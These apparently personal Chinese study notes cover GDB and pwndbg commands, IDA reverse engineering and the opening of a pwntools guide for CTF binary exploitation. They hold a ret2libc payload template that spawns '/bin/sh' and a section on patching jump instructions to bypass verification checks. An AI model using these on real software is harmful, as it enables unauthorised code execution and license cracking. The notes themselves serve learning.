---
title: 逆向与网络安全
date: 2026-04-25
category: 学习记录
tags: ["逆向", "gdb", "pwntools", "ida", "tls", "加密"]
excerpt: GDB/pwndbg 调试、IDA 静态分析、pwntools 与 PWN、TLS 与常用加解密
---

# GDB 调试与 Pwndbg

## GDB 基本概念与启动

GDB（GNU Debugger）是 Linux 及类 Unix 系统下最标准、最强大的底层程序调试工具。它能在不修改源代码的情况下控制程序运行、查看内存、分析崩溃，调试对象覆盖 C/C++、Go、Rust、汇编，甚至没有源码的纯二进制文件。

调试离不开调试信息：编译时必须加 `-g` 参数，否则看不到源码行号（但仍可调试汇编）。调试信息采用 DWARF 格式，包含源码路径、变量名、行号与汇编指令的映射关系，可用 `readelf --debug-dump=info main` 查看。

Pwndbg 只是 GDB 的一组 Python 脚本插件，底层完全依赖 GDB 原生命令，专门为二进制安全 / CTF / PWN 场景增强。同类插件还有 PEDA、GEF，通常 Pwndbg / GEF / PEDA 三选一即可（详见后文「Pwndbg 插件」小节）。

| 命令 | 说明 | 示例 |
|---|---|---|
| `gdb ./file` | 直接加载可执行文件 | `gdb ./main` |
| `gdb -q ./file` | 安静模式，不打印版权和版本信息 | `gdb -q ./main` |
| `gdb ./file core` | 调试崩溃产生的 core dump 文件 | `gdb ./main core.1234` |
| `gdb -p PID` | 附加到正在运行的进程，无需重启 | `gdb -p 12345` |
| `gdb -tui ./file` | 开启文本用户界面（TUI，上下分屏看代码） | `gdb -tui ./main` |
| `file ./file` | 在 GDB 内部加载 / 切换可执行文件 | `file ./test` |
| `quit` / `q` | 退出 GDB | `q` |
| `kill` | 终止当前正在调试的程序 | `kill` |

## 断点管理

断点（breakpoint）是调试的核心。GDB 支持按函数名、源码行号、内存地址甚至条件下断点；Pwndbg 等插件补充了硬件断点等便捷写法。

| 命令 | 说明 | 示例 |
|---|---|---|
| `b main` | 在 main 函数入口下断点（break） | `b main` |
| `b file.c:20` | 在源文件第 20 行下断点 | `b main.cpp:50` |
| `b *0x地址` | 在绝对内存地址处下断点（无源码时必备） | `b *0x0804845a` |
| `b *main+50` | 在函数入口偏移 50 字节处下断点 | `b *main+50` |
| `b func if x==5` | 条件断点，当条件满足时才中断 | `b loop if i==10` |
| `b +10` | 在当前所在行往后第 10 行下断点 | `b +10` |
| `tbreak main` | 临时断点，触发一次后自动删除 | `tbreak main` |
| `hbreak *0x地址` | 硬件断点（数量有限，但不修改内存） | `hbreak *0x08048500` |
| `info b` | 查看所有断点的编号、类型、命中次数等详细信息 | `info b` |
| `delete 1` | 删除编号为 1 的断点 | `delete 1` |
| `delete` | 删除所有断点 | `delete` |
| `disable 1` / `enable 1` | 禁用 / 启用编号为 1 的断点（不带编号则作用于全部） | `disable 2` |
| `ignore 1 10` | 忽略编号为 1 的断点前 10 次命中 | `ignore 1 10` |
| `commands 1` | 断点自动化：命中后自动执行指定 GDB 命令 | 见下方代码块 |
| `clear main` | 清除函数上的所有断点 | `clear main` |
| `clear file.c:20` | 清除指定行的断点 | `clear main.cpp:50` |
| `catch syscall write` | 在调用指定系统调用时中断（还有 `catch fork`、`catch exec` 等） | `catch syscall write` |

`commands` 的写法是：先 `commands 断点号`，GDB 会进入子提示符逐行输入要执行的命令，最后以 `end` 结束：

```gdb
commands 1
> p x
> c
> end
```

## 运行控制

| 命令 | 说明 | 示例 |
|---|---|---|
| `r` / `run` | 从头开始运行程序，若下过断点会停在断点处 | `r` |
| `r arg1 arg2` | 带命令行参数运行 | `r 10 hello` |
| `r < input.txt` | 重定向标准输入 | `r < test.txt` |
| `c` / `continue` | 继续运行，直到下一个断点或程序结束 | `c` |
| `n` / `next` | 单步跳过：执行一行代码，不进入函数内部 | `n` |
| `s` / `step` | 单步进入：遇到函数调用时进入函数内部 | `s` |
| `ni` / `nexti` | 执行一条汇编指令，不进入函数调用 | `ni` |
| `si` / `stepi` | 执行一条汇编指令，进入函数调用 | `si` |
| `finish` | 运行直到当前函数返回，并停在调用处 | `finish` |
| `u` / `until` | 运行到当前循环体末尾，快速跳出 for/while | `u` |
| `advance *0x地址` | 运行到指定地址停止（相当于临时断点 + 继续） | `advance *0x555555555200` |
| `return expr` | 强制当前函数立即返回 expr 值，跳过后续代码 | `return 0` |
| `call func()` | 调用函数但不跳转到那里 | `call puts("test")` |
| `skip func` | 每次执行到都自动跳过该函数 | `skip func_name` |
| Ctrl+C | 程序死循环或阻塞时强制中断，回到 GDB 命令行 | 程序卡住时按 |
| `signal 2` | 向程序发送信号（如模拟 Ctrl+C 的 SIGINT） | `signal 11` |

## 查看数据（print）

`p` / `print` 是查看变量与表达式的命令，配合格式后缀可以控制进制与类型。

| 命令 | 说明 | 示例 |
|---|---|---|
| `p var` | 打印变量的值 | `p count` |
| `p &var` | 打印变量的内存地址 | `p &count` |
| `p *ptr` | 打印指针指向的值 | `p *head` |
| `p arr[0]` | 打印数组元素 | `p array[2]` |
| `p/x var` | 以十六进制打印 | `p/x 255`（输出 0xff） |
| `p/d var` | 以十进制打印 | `p/d 0xff`（输出 255） |
| `p/t var` | 以二进制打印 | `p/t 255` |
| `p/c var` | 以字符形式打印 | `p/c 0x41`（输出 'A'） |
| `p/s var` | 以字符串形式打印 | `p/s char_ptr` |
| `p array` | 打印整个静态数组 | `p my_arr` |
| `p *array@10` | 打印动态数组 / 指针的前 10 个元素 | `p *ptr@20` |
| `display var` | 每次程序暂停时自动打印该变量的值 | `display i` |
| `undisplay 1` | 取消编号为 1 的自动打印 | `undisplay 1` |
| `printf "%d\n", var` | C 语言风格格式化打印 | `printf "x=%d, y=%f\n", x, y` |
| `set var i = 10` | 调试中动态修改变量的值 | `set var i = 10` |
| `call func(10)` | 调试中强制调用某个函数 | `call puts("hello")` |

## 查看内存（x 命令）

`x` 是 GDB 查看内存最强的功能，语法为 `x / N F U 地址`，其中 N 是数量、F 是格式、U 是单位：

- N（数量）：要查看的内存单元个数，如 `10`；
- F（格式）：`x` 十六进制、`d` 十进制、`s` 字符串、`i` 指令、`c` 字符、`t` 二进制、`u` 无符号十进制、`f` 浮点数（最常用 `x` 和 `s`）；
- U（单位）：`b` 1 字节、`h` 2 字节、`w` 4 字节（默认）、`g` 8 字节（64 位常用 `g`，32 位常用 `w`）。

| 命令 | 说明 | 示例 |
|---|---|---|
| `x/10gx $rsp` | 查看栈指针指向的 10 个 8 字节（64 位核心命令） | `x/10gx $rsp` |
| `x/20wx $esp` | 查看栈指针指向的 20 个 4 字节（32 位核心命令） | `x/20wx $esp` |
| `x/s 0xffffd000` | 查看指定地址的字符串，遇到 \0 停止 | `x/s 0xffffd000` |
| `x/10i $pc` | 查看当前程序指针（PC）处的 10 条汇编指令 | `x/10i $pc` |
| `x/32bx &var` | 以字节为单位查看变量 var 的 32 字节内存布局 | `x/32bx &buffer` |
| `x/1xw $eip` | 查看 32 位当前指令指针处的 4 字节 | `x/1xw $eip` |
| `set {int}addr = val` | 向指定内存地址写入整数值 | `set {int}0xffffd000 = 0x41414141` |
| `set {char[4]}addr = "AAAA"` | 向指定内存地址写入字符串 | `set {char[4]}0xffffd000 = "AAAA"` |

## 寄存器操作

| 命令 | 说明 | 示例 |
|---|---|---|
| `info registers` | 显示所有通用寄存器和状态寄存器的值 | `info registers` |
| `info registers rax rdi` | 只显示指定的寄存器 | `info registers rax rsp rip` |
| `p/x $rax` | 打印 rax 寄存器的十六进制值 | `p/x $rax` |
| `p/d $eax` | 打印 eax 寄存器的十进制值 | `p/d $eax` |
| `set $rax = 0` | 修改寄存器的值 | `set $rax = 0` |
| `info eflags` | 查看标志寄存器状态（ZF 零标志、CF 进位标志等） | `info eflags` |

x86 寄存器速记：64 位常用 `rax rbx rcx rdx rsi rdi rbp rsp rip r8-r15`，32 位对应 `eax ebx ecx edx esi edi ebp esp eip`。x86-64 调用约定下前 6 个参数依次放在 `rdi rsi rdx rcx r8 r9`，返回值在 `rax`，栈顶为 `rsp`；x86-32 则是参数压栈、返回值在 `eax`、栈顶为 `esp`。`call` 等价于 push 返回地址 + 跳转，`ret` 等价于 pop 返回地址 + 跳转。

## 查看栈与调用栈

| 命令 | 说明 | 示例 |
|---|---|---|
| `bt` / `backtrace` | 打印完整函数调用栈（从当前函数到 main 再到 _start） | `bt` |
| `bt full` | 打印调用栈并显示每一层的局部变量值 | `bt full` |
| `bt 5` | 只打印调用栈前 5 层 | `bt 5` |
| `frame 2` | 切换到调用栈第 2 层，查看该层上下文 | `frame 2` |
| `info frame` | 查看当前栈帧的详细信息（地址、大小、保存的寄存器） | `info frame` |
| `info args` | 查看当前函数的参数值 | `info args` |
| `info locals` | 查看当前函数的局部变量值 | `info locals` |
| `up` | 调用栈中向上一级移动（向着 main 方向） | `up` |
| `down` | 调用栈中向下一级移动（向着崩溃点方向） | `down` |

栈帧典型布局从低地址到高地址为：局部变量 → saved ebp → return address → 参数 → 调用者栈帧。缓冲区溢出的核心思路正是用输入数据覆盖局部变量 → 覆盖 saved ebp → 覆盖 return address，最终控制 EIP/RIP。

## 观察点与捕获点

观察点（watchpoint）在内存被读 / 写时中断，适合排查"变量被谁改了"；捕获点（catchpoint）在发生指定事件（系统调用、异常等）时中断。

| 命令 | 说明 | 示例 |
|---|---|---|
| `watch var` | 写观察点：变量 var 被写入时中断 | `watch my_struct.status` |
| `rwatch var` | 读观察点：变量 var 被读取时中断 | `rwatch global_flag` |
| `awatch var` | 读写观察点：读或写都中断 | `awatch config.updated` |
| `info watchpoints` | 查看所有观察点 | `info watchpoints` |
| `catch fork` | 程序调用 fork() 时中断 | `catch fork` |
| `catch exec` | 程序调用 exec() 时中断 | `catch exec` |
| `catch syscall open` | 调用指定系统调用时中断 | `catch syscall write` |
| `catch throw` | C++ 抛出异常时中断 | `catch throw` |
| `catch catch` | C++ 捕获异常时中断 | `catch catch` |

`watch` / `rwatch` / `awatch` 也可直接作用于内存地址，如 `rwatch *0xffffd000`。

## 多线程调试

| 命令 | 说明 | 示例 |
|---|---|---|
| `info threads` | 列出当前进程所有线程 ID 及状态 | `info threads` |
| `thread 2` | 切换到线程 2 的上下文 | `thread 2` |
| `thread apply all bt` | 打印所有线程的调用栈（排查死锁神器） | `thread apply all bt` |
| `thread apply 2 bt` | 只打印线程 2 的调用栈 | `thread apply 2 bt` |
| `set scheduler-locking on` | 锁定线程调度，只有当前线程执行（防干扰） | `set scheduler-locking on` |
| `set scheduler-locking off` | 解锁，所有线程自由运行（默认） | `set scheduler-locking off` |
| `break func thread 2` | 只在特定线程（如线程 2）下断点 | `break loop if pthread_self() == 2` |

## 多进程调试

程序 fork 后默认只跟父进程。GDB 通过 follow-fork-mode 决定跟随哪个进程。

| 命令 | 说明 | 示例 |
|---|---|---|
| `set follow-fork-mode parent` | 默认：fork 后只调试父进程，子进程正常运行 | `set follow-fork-mode parent` |
| `set follow-fork-mode child` | fork 后只调试子进程，父进程脱离 | `set follow-fork-mode child` |
| `set follow-fork-mode both` | 父子进程都调试（GDB 7.12+，会克隆出新的 GDB） | `set follow-fork-mode both` |
| `set detach-on-fork on` | 不被调试的进程脱离 GDB 独立运行 | `set detach-on-fork on` |
| `set detach-on-fork off` | 不被调试的进程被挂起，可随时切过去 | `set detach-on-fork off` |
| `info inferiors` | 查看当前 GDB 控制的所有进程 | `info inferiors` |
| `inferior 2` | 切换到编号为 2 的进程 | `inferior 2` |

## core dump 与信号处理

程序崩溃（如段错误）后可用 core dump 事后定位现场：

| 命令 / 操作 | 说明 | 示例 |
|---|---|---|
| `ulimit -c unlimited` | 在终端执行，允许生成 core dump 文件（只对当前终端生效） | `ulimit -c unlimited` |
| `gdb ./file core` | 加载可执行文件与 core 文件，直接定位崩溃位置 | `gdb ./main core.3456` |
| `bt` | 加载 core 后先执行 bt 看崩溃时的调用栈 | `bt` |
| `info signals` | 查看 GDB 对所有信号的默认处理方式 | `info signals` |
| `handle SIGPIPE nostop` | 收到 SIGPIPE 时不停止程序 | `handle SIGPIPE nostop` |
| `handle SIGINT stop` | 收到 SIGINT（Ctrl+C）时停止程序 | `handle SIGINT stop` |
| `handle SIGURG noprint` | 收到信号时不打印提示信息 | `handle SIGURG noprint` |
| `signal 11` | 手动向程序发送信号（模拟段错误） | `signal 11` |

## 源码与执行路径查看

| 命令 | 说明 | 示例 |
|---|---|---|
| `list` / `l` | 显示当前行附近的源码 | `l` |
| `l func` | 显示指定函数开头的源码 | `l main` |
| `l file.c:10` | 显示指定文件的源码 | `l utils.cpp:20` |
| `l 10,30` | 显示第 10 到 30 行的源码 | `l 50,80` |
| `set listsize 20` | 设置 list 一次显示的行数 | `set listsize 30` |
| `forward-search "regex"` | 在源码中向下搜索正则表达式 | `forward-search "password"` |
| `reverse-search "regex"` | 在源码中向上搜索正则表达式 | `reverse-search "memcpy"` |
| `info line *0x地址` | 查看指定内存地址对应的源码行号 | `info line *0x555555555189` |
| `disas` / `disassemble` | 反汇编当前函数 | `disas` |
| `disas /r` | 反汇编并显示原始字节码（机器码） | `disas /r main` |
| `info functions` | 列出所有函数符号 | `info functions vuln` |

## 自动化与脚本化

| 语法 | 说明 | 示例 |
|---|---|---|
| `gdb -x script.gdb` | 启动时执行 script.gdb 中的命令 | `gdb -x init.gdb ./main` |
| `gdb -batch -ex "cmd"` | 批处理模式，执行完直接退出（适合写 Shell 脚本） | `gdb -batch -ex "run" -ex "bt" ./main` |
| `define cmd` | 在 GDB 内部定义自定义命令 | 见下方代码块 |
| `source script.gdb` | 在 GDB 内部加载执行脚本 | `source helpers.gdb` |
| `set logging on [file]` | 将 GDB 输出记录到文件 | `set logging on gdb.log` |
| `set logging off` | 停止记录 | `set logging off` |
| `set pagination off` | 关闭分页提示（跑脚本时防止按空格卡住） | `set pagination off` |
| `if/else/while` | GDB 内置控制流语法，用于编写复杂脚本 | `if $rax == 0` 判断分支 |

```gdb
define print_esp
> p/x $esp
> end
```

## TUI 模式（文本界面分屏）

| 快捷键 / 命令 | 说明 |
|---|---|
| `gdb -tui ./file` | 以 TUI 模式启动 |
| Ctrl+X A | 切换 TUI 模式开 / 关 |
| Ctrl+X 1 | 单窗口模式（只显示代码或命令） |
| Ctrl+X 2 | 双窗口模式（上面代码、下面命令） |
| Ctrl+X O | 在代码窗口和命令窗口之间切换焦点 |
| Ctrl+X S | 切换源码窗口和汇编窗口 |
| Ctrl+X R | 切换寄存器窗口 |
| `layout src` | 显示源代码窗口 |
| `layout asm` | 显示汇编代码窗口 |
| `layout split` | 同时显示源码和汇编 |
| `layout regs` | 显示寄存器窗口 |
| `focus cmd` | 将光标焦点移到命令行 |
| `focus src` | 将光标焦点移到源码窗口（可用方向键滚动看代码） |

## 与 Makefile 结合调试

| 场景 | 命令 / 操作 |
|---|---|
| 调试单个文件 | `g++ -g main.cpp -o main && gdb ./main` |
| 调试多文件工程 | 在 Makefile 的 CXXFLAGS 中加 `-g`，如 `CXXFLAGS := -Wall -g` |
| 调试运行时报错 | 运行得到 `Return value: 139`（段错误）后，执行 `gdb ./main core` |
| 不修改 Makefile 加 -g | 命令行强制覆盖变量：`make CXXFLAGS="-g"` 或 `make CFLAGS="-g -O0"` |
| 优化带来的干扰 | 调试时最好加 `-O0` 关闭优化，否则变量可能被优化掉、单步会乱跳 |

## 常见调试场景排错

| 场景 | 排错思路与命令 |
|---|---|
| 段错误 | 直接 gdb 运行，输入 `r` 回车，崩溃时自动停在崩溃行，执行 `bt` 看调用栈 |
| 变量值莫名被改 | 对变量设写观察点 `watch var`，单步跟踪看是哪个函数改了它 |
| 死循环 / 卡住 | Ctrl+C 中断，`bt` 看卡在哪个函数，`info threads` 看线程 |
| 多线程数据竞争 | `set scheduler-locking on` 后手动 `thread ID` 切换线程，观察共享变量 |
| 进不了动态库函数 | 确认是否编译了调试符号，或使用 `set step-mode on` |
| 内存越界 / 堆溢出 | 用 Valgrind 辅助排查：`valgrind --leak-check=full ./main` |

## Pwndbg：GDB 的 PWN 插件

### 定位与安装

Pwndbg 是 Python 编写的 GDB 增强插件，专为二进制安全 / CTF / PWN 设计，常被形容为"GDB + PEDA + pwntools 的终极结合"，目标是让调试二进制程序像写 Python 一样简单（自动显示寄存器、栈、代码、反汇编）。几者的关系：GDB 是底层调试器，PEDA 是另一款较老的同定位插件，GEF 是功能丰富的又一选择（Pwndbg / GEF / PEDA 三选一即可）；pwntools 则是 Python 的 CTF 利用框架，负责写 exploit，与 Pwndbg 搭配使用正好把"交互脚本"和"调试"分开。

安装步骤：

```bash
sudo apt install gdb
sudo apt install python3 python3-pip python3-dev
git clone https://github.com/pwndbg/pwndbg.git && cd pwndbg && ./setup.sh
```

- 验证：`gdb ./binary` 启动后自动加载 Pwndbg，提示符变为 `pwndbg>`。
- 更新：`cd pwndbg && git pull && ./setup.sh`。
- 卸载：删除 pwndbg 目录，并清除 `~/.gdbinit` 中的 `source` 行。
- 配置文件：GDB 启动时自动加载 `~/.gdbinit`，Pwndbg 即通过其中的 `source ~/pwndbg/gdbinit.py` 挂载；可在末尾追加 `set disassembly-flavor intel` 把汇编设为 Intel 语法（PWN 必备），`att` 可切回 AT&T 语法。
- 其他启动方式与 GDB 相同：`gdb -q ./binary` 安静模式、`gdb -tui ./binary` TUI 分屏、`gdb ./vuln core` 调试 core、`gdb -p PID` 附加进程、`gdb -x script.gdb` 执行脚本。
- 传参运行：`r` 运行、`r < input.txt` 重定向输入、`r <<< "AAAA"` 用 Here String 传参（如 `r <<< $(python3 -c "print('A'*64)")`）。

### 自动显示面板

Pwndbg 启动即自动显示若干信息面板，命中断点 / 单步后自动刷新：

| 面板 | 说明 |
|---|---|
| LEGEND | 颜色图例，解释各颜色含义 |
| REGISTERS | 寄存器面板：自动显示所有通用寄存器、eip/rip、eflags 当前值，变化值高亮 |
| STACK | 栈面板：自动显示栈顶附近的内存内容（十六进制 + ASCII） |
| CODE / DISASM | 代码 / 反汇编面板：自动显示当前执行位置附近的汇编代码并跟随 |
| BACKTRACE | 调用栈面板：自动显示函数调用链（当前 → main → _start） |
| SOURCE | 源码面板：编译时加 -g 后自动高亮当前执行行 |

### Pwndbg 独有命令速查

GDB 原生命令（`b`、`r`、`c`、`x`、`p`、`bt` 等）在 Pwndbg 中完全可用，以下是 Pwndbg 增强 / 独有的高频命令：

| 命令 | 缩写 | 说明 |
|---|---|---|
| `vmmap` | - | 查看进程完整内存映射（地址范围、权限、文件名），GDB 原生需要翻 /proc/pid/maps |
| `checksec` | - | 检查二进制安全保护机制（NX/Canary/PIE/RELRO） |
| `registers` | `regs` | 彩色显示所有寄存器值 |
| `stack` | - | 显示栈面板，`stack 20` 查看栈顶 20 个 8 字节 |
| `telescope` | `tele` | 高级栈 / 内存查看，可追踪指针链，如 `telescope $rsp 30` |
| `search` | - | 在内存中搜索字节序列，如 `search 0x41414141` |
| `retaddr` | - | 显示当前函数的返回地址 |
| `canary` | - | 显示 Stack Canary 的值 |
| `pie` | - | 查看 PIE（地址随机化）相关信息 |
| `shellcode` | - | 列出内置 shellcode，如 `shellcode amd64.linux.execve` |
| `asm` | - | 在线汇编：输入汇编输出字节码，如 `asm nop` → `0x90` |
| `disasm` | - | 把字节码反汇编为指令，如 `disasm \x90\x90\x90\xc3` |
| `cyclic` | - | 生成 de Bruijn 循环模式字符串，如 `cyclic 200` |
| `context` | - | 显示全部上下文信息（寄存器 + 栈 + 代码） |

栈与内存的对照：`stack` / `telescope` 相当于手动的 `x/20gx $rsp`（64 位）或 `x/20wx $esp`（32 位），只是带彩色高亮与指针箭头。经典找偏移流程是：`cyclic 200` 生成模式字符串 → 程序崩溃后用 `cyclic -l 0x61616168` 反查偏移。

`search` 常见用法：

| 命令 | 说明 |
|---|---|
| `search 0x41414141` | 默认在可写 + 可执行区域搜索该值 |
| `search -p $rsp 0x41414141` | 从指定地址（如栈顶）开始搜索 |
| `search -4 0x41414141` | 按 4 字节值搜索 |
| `search -8 0x7fffffffde00` | 按 8 字节值搜索 |
| `search -s "/bin/sh"` | 搜索字符串 |
| `search -x 41414141` | 按十六进制字节序列搜索 |
| `search -t byte 0xc3` | 按类型搜索（如找 ret 指令的字节 c3） |

`/bin/sh` 字符串是经典 PWN 目标：先 `search -s "/bin/sh"` 找到字符串地址，再配合 libc 里的 gadget 构造 ROP。

### checksec 检查的安全机制

| 检查项 | 说明 | 对利用的影响 |
|---|---|---|
| NX (DEP) | 栈不可执行 | 不能在栈上直接执行 shellcode |
| Canary | 栈溢出保护（随机值检测） | 需要先泄露 canary 值 |
| PIE (ASLR) | 地址空间布局随机化 | 地址每次运行都变，需要信息泄露 |
| RELRO | 只读重定位（Partial / Full） | Full RELRO 可防 GOT 覆写 |
| Fortify | FORTIFY_SOURCE 加固的库函数 | 部分函数带缓冲区大小检查 |

### Pwndbg 与 pwntools 联合调试

工作流：先在 pwntools 脚本中写好断点（`gdb.attach`），程序停在断点后在 Pwndbg 里分析，`c` 继续后再让脚本发送 payload，崩溃后用 Pwndbg 查看寄存器与栈、分析偏移量。

```python
from pwn import *

context.arch = 'amd64'            # 64 位
context.log_level = 'debug'

p = process('./vuln')             # 本地调试
# p = remote('ip', port)          # 远程连接

gdbscript = '''
b *main+50
c
'''
gdb.attach(p, gdbscript)          # 附加 GDB（Pwndbg）

# 用 cyclic 找偏移：先发 cyclic(200)，在 Pwndbg 里 cyclic -l 0x61616168
payload = b'A' * offset           # 填充到返回地址
payload += p64(system_addr)       # system@plt
payload += p64(exit_addr)         # 返回到 exit
payload += p64(binsh_addr)        # "/bin/sh"

p.sendline(payload)
p.interactive()
```

# IDA 静态分析

## 核心生存法则

1. 机器码具有二义性：同一串十六进制数字，IDA 可以解释为"代码（汇编）"，也可以解释为"数据（字节）"。IDA 的自动分析经常出错，手动纠正才是逆向的日常。
2. 逆向分析标准路径：找字符串 → 追交叉引用 → 转代码 → 建函数 → 看伪代码（F5）→ 重命名与注释。
3. 随时存盘：Ctrl+S 保存的是 .idb / .i64 数据库（包含你所有的分析成果），不保存等于白干。
4. 数据库后缀：x86 生成 `.idb`，x64 生成 `.i64`。
5. 遇到整片 `db 0xXX` 且转代码是乱码，大概率是加壳了，先去脱壳，不要死磕静态分析。

## 界面与快捷键

| 类别 | 快捷键 | 说明 |
|---|---|---|
| 视图 | 默认窗口 | 反汇编窗口（核心） |
| 视图 | `F5` | 伪代码窗口（最常用） |
| 视图 | Hex View | 十六进制窗口 |
| 视图 | `Shift+F12` | 字符串窗口（找线索） |
| 视图 | `Shift+F1` | 结构体窗口 |
| 视图 | `Shift+F7` | 段窗口 |
| 视图 | `Shift+E` | 导入表 |
| 导航 | `G` | 跳转到地址 |
| 导航 | `Escape` | 返回上一位置（被 F5 弹飞后的回家键） |
| 导航 | `Ctrl+Enter` | 前进到下一位置 |
| 编辑 | `N` | 重命名（变量 / 函数） |
| 编辑 | `;` | 添加普通注释 |
| 编辑 | `Shift+;` | 添加重复注释 |
| 编辑 | `U` | 撤销定义（慎用，可能把代码撤销回数据） |
| 搜索 | `Alt+T` | 搜索文本 |
| 搜索 | `Alt+B` | 搜索十六进制特征码 |
| 搜索 | `Alt+I` | 搜索汇编指令 |
| 搜索 | `X` | 交叉引用（谁调用了它） |

## 四步代码 / 数据转换法

核心矛盾：IDA 经常把"代码"认成"数据"、把"数据"认成"代码"，或者漏认"函数"。

### 数据 → 代码（U → C）

场景：看到一堆 `db 0xXX`，但通过调试知道这里实际是指令。

操作：选中位置 → 按 `U`（Undefined，清空状态）→ 按 `C`（Create Code，强制转汇编）。

结果：`db 0xE8` 变成 `call xxx`。

### 代码 → 数据（U → D）

场景：看到一段很奇怪的汇编指令（如连续无意义的 add），但这里实际存的是一张表（跳转表、密钥等）。

操作：选中位置 → 按 `U`（Undefined）→ 按 `D`（Define Data，转为数据）。连续按 `D` 会在 DB（1 字节）→ DW（2 字节）→ DD（4 字节）→ DQ（8 字节）之间切换。

数组化：选中一长串数据 → `Edit` → `Array`（或 `Alt+A`），定义为整齐的数组。

### 散装代码 → 创建函数（P 键）

场景：找到代码入口了，但没有蓝色函数名标签，按 F5 没反应。

操作：确保入口处已经是代码（按 C）→ 光标停在入口第一条指令 → 按 `P`（Create Function）。

结果：出现蓝色函数标签，可以按 F5 了。

### 错误函数 → 取消函数

场景：IDA 把不该包进去的代码（如跳转表数据）算进了函数，导致 F5 报错，或按 P 报错"指令属于其他函数"。

操作：光标点在错误函数内部 → `Alt+P`（Edit → Functions → Delete Function）。

结果：蓝色高亮消失、打回散装代码，可重新用 D 转数据，或重新划定范围按 P。

### 终极修复：修正栈帧（Alt+P 编辑）

场景：能 P 创建函数，但一按 F5 就报错 `Sp analysis failed`（栈不平衡）。

原因：代码里有非标准的直接操作 ESP 的指令，IDA 算不清栈。

操作：光标在函数内 → 按 `Alt+P` 打开函数属性窗口 → 尝试调整 `BP relative` 偏移，或勾选 `Custom calling convention`，或缩小函数的结束地址，把干扰代码踢出去。

## 伪代码窗口（F5）速读

- 变量命名：`v1` `v2` `v3` 是 IDA 自动分配的局部变量（最常见）；`arg1` `arg2` 是函数参数（32 位靠栈传参，64 位 Windows 靠 RCX/RDX/R8/R9，Linux 靠 RDI/RSI/RDX…）；`sub_xxxxx` 是调用的未知子函数。
- 类型后缀：`dword ptr` 32 位（4 字节）、`qword ptr` 64 位（8 字节）、`byte ptr` 8 位（1 字节）、`word ptr` 16 位（2 字节）。
- 指针与偏移：`*((_QWORD *)ptr + 1) = ...` 对应 C 里的 `ptr[1]` 或 `ptr->next`。
- 常见 C 标准库还原：`v5 = malloc(0x10u)` 表示分配了 16 字节内存；`memset(&v1, 0, ...)` 表示变量初始化清零；`memcpy / memmove` 是内存拷贝；`strcmp / strncmp` 是字符串比较（常跟在密码验证处）。

## 实战分析套路（SOP）

**套路 1：从字符串突破（最常用）**

`Shift+F12` 搜索关键字（如 "错误"、"success"、"License"）→ 双击跳转 → 按 `X` 查看交叉引用 → 跳到调用处发现是 `db` → 按 `C` 转代码 → 按 `P` 建函数 → `F5` 看逻辑。

**套路 2：修复 switch 跳转表**

F5 里看到 switch 但下面逻辑不对 → 去汇编里找 `jmp [eax*4+table_addr]` → 跳到 table 处看到乱码指令 → 按 `U` 取消定义 → 连续按 `D` 直到变成 `dd`（4 字节）→ 再回来看 F5，逻辑自动修复。

**套路 3：脱壳后的重建**

找到真正的 OEP（原始入口点）→ 停在 OEP → 全选当前段代码 → 按 `U` 清理壳的残留错误定义 → 按 `C` 重新生成代码 → 全选 → 按 `P` 批量创建函数 → F5 挨个看。

## Patch（打补丁 / 破解）

核心修改法则：

| 手法 | 机器码 | 用途 |
|---|---|---|
| 反转逻辑 | `JZ` (74) 改 `JNZ` (75) | 最经典的破解手法 |
| 跳过代码 | `JMP` 改 `NOP` (90 90) | 跳过验证代码 |
| 废除调用 | `Call` 改 `NOP` (90 90 90 90 90) | 跳过某个验证函数 |

操作步骤：

1. 安装 Keypatch 插件（千万别用 IDA 自带的 Assemble，太难用）。
2. 光标停在要改的汇编指令上。
3. 按 `Ctrl+Alt+K`（Keypatch 快捷键）输入新指令（如 `jnz short xxx`）。
4. `Edit` → `Patch program` → `Apply patches to input file...` 将修改写回原文件。

⚠️ 警告：Patch 前必须备份原文件！改错了直接凉凉。

## 必备插件清单

| 插件 | 用途 |
|---|---|
| Keypatch | 必备。代替原生汇编器，支持复杂指令直接 Patch |
| Hex-Rays | 必备。F5 反编译的引擎 |
| FindCrypt | 找加密算法特征码（自动识别 AES/DES/MD5 等常量） |
| LazyIDA | 提供一堆好用的右键菜单小工具 |
| D-810 | 去 OLLVM 混淆（控制流平坦化）的利器 |

## IDAPython 一句话脚本

批量打印所有函数名及地址：

```python
import idautils
for addr in idautils.Functions():
    print(f"{hex(addr)}: {idc.get_func_name(addr)}")
```

批量重命名所有 `sub_` 开头的函数：

```python
import idautils, idc
count = 0
for addr in idautils.Functions():
    name = idc.get_func_name(addr)
    if name.startswith("sub_"):
        idc.set_name(addr, f"func_{count}", idc.SN_NOCHECK)
        count += 1
```

提取当前地址的所有交叉引用：

```python
import idautils
addr = idc.get_screen_ea()
refs = [f"{hex(x.frm)} -> {idc.get_func_name(x.frm)}" for x in idautils.XrefsTo(addr)]
print("\n".join(refs))
```

# pwntools 与 PWN 脚本

## 核心定位与安装

pwntools 是 Python 生态中最强大的 CTF PWN / 二进制利用框架，适用场景覆盖缓冲区溢出、ROP 链构造、格式化字符串漏洞、堆利用、Shellcode 编写、远程交互与内存泄漏利用。

- 安装：`pip install pwntools`（依赖 binutils，Linux 下 `apt install binutils`；Windows 下建议 WSL / Kali 虚拟机）。
- 导入：`from pwn import *` 一句话导入所有功能，CTF 标配。
- 注意：pwntools 是 Linux 原生库，Windows 上只能用于连接远程靶机（远程交互部分），本地调试和编译必须在 Linux 下进行。
- 背景设置（写在脚本最开头）：

```python
from pwn import *
context(os='linux', arch='amd64', log_level='debug')   # 64 位 ELF
context(os='linux', arch='i386', log_level='info')     # 32 位 ELF
context(os='linux', arch='arm', log_level='debug')     # ARM
context(os='linux', arch='mips', log_level='info')     # MIPS
```

日志级别：`debug` 打印所有收发数据（调试时开）、`info` 只打关键信息（比赛提交时开）、`error` 只打印错误、`warn` 打印警告及以上。

## 连接与交互

| API | 说明 |
|---|---|
| `io = process('./pwn1')` | 启动本地程序 |
| `io = process('./pwn1', argv=['arg1','arg2'])` | 带命令行参数启动 |
| `io = process('./pwn1', env={'KEY':'VAL'})` | 带环境变量启动 |
| `io = process(['./pwn1'])` | 等价写法 |
| `io = remote('ip', port)` | 远程连接，如 `remote('192.168.1.100', 9999)` |
| `io = remote('pwn.ctf.com', 80, ssl=True)` | SSL 连接 |

IO 操作统一了本地与远程接口：

| API | 说明 |
|---|---|
| `io.send(data)` | 发送原始字节 |
| `io.sendline(data)` | 发送数据 + 换行 `\n`（最常用） |
